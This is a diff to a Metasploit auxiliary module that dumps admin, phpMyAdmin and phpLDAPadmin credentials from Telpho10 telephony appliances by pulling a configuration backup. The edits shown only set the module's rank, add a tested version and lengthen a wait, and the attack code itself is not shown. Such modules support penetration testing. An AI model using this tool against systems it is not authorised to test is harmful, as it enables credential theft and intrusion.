@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  Rank = ExcellentRanking
 
   def initialize(info={})
     super(update_info(info,
@@ -15,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
         appliance. This module generates a configuration backup of Telpho10,
         downloads the file and dumps the credentials for admin login,
         phpmyadmin, phpldapadmin, etc.
-        This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39.
+        This module has been successfully tested on the appliance versions 2.6.31, 2.6.39 and 2.6.47.
       },
       'Author'         => 'Jan Rude', # Vulnerability Discovery and Metasploit Module
       'License'        => MSF_LICENSE,
@@ -101,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
     })
     if res && res.code == 200
       print_status('Generating backup')
-      sleep(1)
+      sleep(2)
     else
       print_error("Could not find vulnerable script. Aborting.")
       return nil
